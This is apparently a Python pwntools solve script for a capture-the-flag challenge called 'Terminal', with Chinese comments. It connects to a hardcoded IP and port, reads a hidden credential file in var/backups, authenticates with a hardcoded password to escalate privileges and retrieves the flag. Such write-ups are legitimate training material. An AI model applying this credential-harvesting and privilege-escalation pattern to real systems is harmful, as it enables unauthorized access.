#!/usr/bin/env python3
"""
题目名称: Terminal
类别: Misc (受限 Shell 提权)
解题思路:
    1. 连接到受限 shell 环境
    2. 进入 var/backups 目录，读取隐藏文件 .integrity_check 获取凭据
    3. 使用 auth 命令提权
    4. 执行 getflag 获取 flag
依赖: pwntools (pip install pwntools)
"""

import sys

try:
    from pwn import remote
except ImportError:
    print("[!] 需要安装 pwntools: pip install pwntools", file=sys.stderr)
    sys.exit(1)

# 目标地址（可通过命令行参数覆盖）
TARGET_HOST = "95.111.234.103"
TARGET_PORT = 9999
# 隐藏文件中的认证密码
AUTH_PASSWORD = "q#9L!z@X_v2$mR"


def exploit(host: str = TARGET_HOST, port: int = TARGET_PORT) -> str:
    """执行受限 shell 提权获取 flag"""
    r = remote(host, port)

    r.recvuntil(b"/$")

    # 进入备份目录
    r.sendline(b"cd var/backups")
    r.recvuntil(b"$")

    # 读取隐藏凭据文件
    r.sendline(b"cat .integrity_check")
    data = r.recvuntil(b"$")
    print(data.decode())

    # 使用凭据提权
    r.sendline(f"auth {AUTH_PASSWORD}".encode())
    r.recvuntil(b"$")

    # 获取 flag
    r.sendline(b"getflag")
    flag = r.recvall(timeout=3)
    r.close()

    return flag.decode()


if __name__ == "__main__":
    if len(sys.argv) > 2:
        host, port = sys.argv[1], int(sys.argv[2])
    else:
        host, port = TARGET_HOST, TARGET_PORT

    try:
        result = exploit(host, port)
        print(result)
    except Exception as e:
        print(f"[!] 连接失败: {e}", file=sys.stderr)
        sys.exit(1)
